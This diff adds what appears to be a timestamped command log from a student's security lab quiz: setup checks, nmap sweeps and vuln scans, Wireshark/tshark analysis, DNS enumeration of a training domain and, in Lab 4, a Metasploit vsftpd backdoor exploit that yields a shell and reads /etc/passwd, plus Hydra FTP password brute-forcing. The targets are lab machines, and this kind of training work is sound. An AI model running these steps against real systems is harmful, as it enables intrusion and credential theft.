@@ -1,0 +1,62 @@
+[2026-05-14T01:34:20-04:00] [LAB-1 TASK-1.1] cd ~/practical_quiz_F2023332043/lab1_kali_setup/
+[2026-05-14T01:34:20-04:00] [LAB-1 TASK-1.1] date --iso-8601=seconds
+[2026-05-14T01:34:20-04:00] [LAB-1 TASK-1.1] id
+[2026-05-14T01:34:20-04:00] [LAB-1 TASK-1.1] hostname
+[2026-05-14T01:39:12-04:00] [LAB-1 TASK-1.2] date --iso-8601=seconds
+[2026-05-14T01:39:12-04:00] [LAB-1 TASK-1.2] vmware-toolbox-cmd -v
+[2026-05-14T01:40:12-04:00] [LAB-1 TASK-1.2] date --iso-8601=seconds
+[2026-05-14T01:40:12-04:00] [LAB-1 TASK-1.2] ls -la /mnt/hgfs/
+[2026-05-14T01:41:08-04:00] [LAB-1 TASK-1.2] date --iso-8601=seconds
+[2026-05-14T01:41:08-04:00] [LAB-1 TASK-1.2] echo "UMT IS Quiz | $(date --iso-8601=seconds)" > /mnt/hgfs/Rashid_Warda_f2023332043_practical_quiz/proof_F2023332043.txt
+[2026-05-14T01:41:08-04:00] [LAB-1 TASK-1.2] cat /mnt/hgfs/Rashid_Warda_f2023332043_practical_quiz/proof_F2023332043.txt
+[2026-05-14T02:03:50-04:00] [LAB-1 TASK-1.3] date --iso-8601=seconds
+[2026-05-14T02:03:50-04:00] [LAB-1 TASK-1.3] ip addr show
+[2026-05-14T02:03:50-04:00] [LAB-1 TASK-1.3] ip route show
+[2026-05-14T02:07:02-04:00] [LAB-1 TASK-1.4] date --iso-8601=seconds
+[2026-05-14T02:07:02-04:00] [LAB-1 TASK-1.4] sudo ss -tlnup
+[2026-05-18T03:21:37-04:00] [LAB-1 TASK-1.3] date --iso-8601=seconds
+[2026-05-18T03:21:37-04:00] [LAB-1 TASK-1.3] ping 192.168.32.138 -c 4
+[2026-05-18T04:43:57-04:00] [LAB-1 TASK-1.3] date --iso-8601=seconds
+[2026-05-18T04:43:57-04:00] [LAB-1 TASK-1.3] ping 192.168.32.139 -c 4
+[2026-05-18T04:49:43-04:00] [LAB-2 TASK-2.1] cd ~/practical_quiz_F2023332043/lab2_enumeration/
+[2026-05-18T04:49:43-04:00] [LAB-2 TASK-2.1] date --iso-8601=seconds
+[2026-05-18T04:49:43-04:00] [LAB-2 TASK-2.1] arp -n
+[2026-05-18T05:00:00-04:00] [LAB-2 TASK-2.2] sudo nmap -sn 192.168.32.0/24
+[2026-05-18T05:05:18-04:00] [LAB-2 TASK-2.3] date --iso-8601=seconds
+[2026-05-18T05:05:18-04:00] [LAB-2 TASK-2.3] sudo nmap -Pn -sS --top-ports 100 192.168.32.139
+[2026-05-18T05:05:00-04:00] [LAB-2 TASK-2.3] sudo nmap -Pn -sS --top-ports 100 192.168.32.138
+[2026-05-18T05:08:40-04:00] [LAB-2 TASK-2.3] date --iso-8601=seconds
+[2026-05-18T05:08:40-04:00] [LAB-2 TASK-2.3] sudo nmap -Pn -sS -p- --min-rate 1000 192.168.32.139
+[2026-05-18T05:11:00-04:00] [LAB-2 TASK-2.3] sudo nmap -Pn -sS -p- --min-rate 1000 192.168.32.138
+[2026-05-18T05:14:42-04:00] [LAB-2 TASK-2.3] date --iso-8601=seconds
+[2026-05-18T05:16:00-04:00] [LAB-2 TASK-2.3] sudo nmap -Pn -sV -sC -O -p 135,139,445 --version-intensity 5 192.168.32.138
+[2026-05-18T05:17:00-04:00] [LAB-2 TASK-2.3] sudo nmap -Pn -sV -sC -O -p 21,22,23,25,53,80,111,139,445,512,513,514,1099,1524,2049,2121,3306,3632,5432,5900,6000,6667,6697,8009,8180,8787 --version-intensity 5 192.168.32.139
+[2026-05-18T05:30:00-04:00] [LAB-2 TASK-2.3] sudo nmap -Pn -p 21,22,23,25,53,80,111,139,445,512,513,514,1099,1524,2049,2121,3306,3632,5432,5900,6000,6667,6697,8009,8180,8787 --script vuln 192.168.32.139 -oN nmap_vuln_F2023332043_t1.txt
+[2026-05-18T05:35:00-04:00] [LAB-2 TASK-2.3] sudo nmap -Pn -p 135,139,445 --script vuln 192.168.32.138
+[2026-05-20T03:58:00-04:00] [LAB-3 TASK-3.1] wireshark -r icmp_F2023332043_lab3.pcap -Y "icmp"
+[2026-05-20T04:08:27-04:00] [LAB-3 TASK-3.1] wireshark -r http_F2023332043_lab3.pcap -Y "http"
+[2026-05-20T04:10:00-04:00] [LAB-3 TASK-3.1] wireshark -r ftp_F2023332043_lab3.pcap -Y "ftp"
+[2026-05-20T01:53:49-04:00] [LAB-3 TASK-3.2] tshark -r icmp_F2023332043_lab3.pcap -Y 'icmp' -T fields -e frame.number -e ip.src -e ip.dst -e icmp.type -e frame.time_delta
+[2026-05-20T01:54:00-04:00] [LAB-3 TASK-3.2] tshark -r http_F2023332043_lab3.pcap -Y 'http.request' -T fields -e frame.number -e ip.src -e ip.dst -e http.request.method -e http.request.uri
+[2026-05-20T01:54:30-04:00] [LAB-3 TASK-3.2] tshark -r ftp_F2023332043_lab3.pcap -Y 'ftp.request.command == "USER" or ftp.request.command == "PASS"' -T fields -e frame.number -e ftp.request.command -e ftp.request.arg
+[2026-05-20T02:10:00-04:00] [LAB-3 TASK-3.3] wireshark -r http_F2023332043_lab3.pcap -Y "http.response.code == 200 && http.content_length > 0"
+[2026-05-20T02:53:51-04:00] [LAB-4 TASK-4.2] sudo msfconsole
+[2026-05-20T02:53:51-04:00] [LAB-4 TASK-4.2] search vsftpd
+[2026-05-20T02:53:51-04:00] [LAB-4 TASK-4.2] use exploit/unix/ftp/vsftpd_234_backdoor
+[2026-05-20T02:53:51-04:00] [LAB-4 TASK-4.2] set RHOSTS 192.168.32.139
+[2026-05-20T02:53:51-04:00] [LAB-4 TASK-4.2] set LHOST 192.168.32.132
+[2026-05-20T02:53:51-04:00] [LAB-4 TASK-4.2] run
+[2026-05-20T02:54:00-04:00] [LAB-4 TASK-4.2] shell
+[2026-05-20T02:54:00-04:00] [LAB-4 TASK-4.2] id && whoami
+[2026-05-20T02:54:00-04:00] [LAB-4 TASK-4.2] uname -a
+[2026-05-20T02:54:00-04:00] [LAB-4 TASK-4.2] cat /etc/passwd | head -20
+[2026-05-20T03:17:52-04:00] [LAB-4 TASK-4.3] hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt -t 4 -vV ftp://192.168.32.139
+[2026-05-20T03:24:52-04:00] [LAB-4 TASK-4.3] echo "msfadmin" > custom_pass.txt
+[2026-05-20T03:24:52-04:00] [LAB-4 TASK-4.3] hydra -l msfadmin -P custom_pass.txt -t 1 -vV ftp://192.168.32.139
+[2026-05-20T03:28:09-04:00] [LAB-5 TASK-5.1] date --iso-8601=seconds
+[2026-05-20T03:28:09-04:00] [LAB-5 TASK-5.1] whois zonetransfer.me > whois_F2023332043_lab5.txt
+[2026-05-20T03:28:09-04:00] [LAB-5 TASK-5.1] cat whois_F2023332043_lab5.txt | head -50
+[2026-05-20T03:29:00-04:00] [LAB-5 TASK-5.1] for TYPE in A MX NS TXT SOA CNAME AAAA; do echo "=== $TYPE ===" >> dig_F2023332043_lab5.txt; dig +noall +answer zonetransfer.me $TYPE >> dig_F2023332043_lab5.txt; done
+[2026-05-20T03:29:00-04:00] [LAB-5 TASK-5.1] cat dig_F2023332043_lab5.txt
+[2026-05-20T03:30:00-04:00] [LAB-5 TASK-5.1] dig axfr @nsztm1.digi.ninja zonetransfer.me > axfr_F2023332043_lab5.txt 2>&1
+[2026-05-20T03:30:00-04:00] [LAB-5 TASK-5.1] cat axfr_F2023332043_lab5.txt | head -30
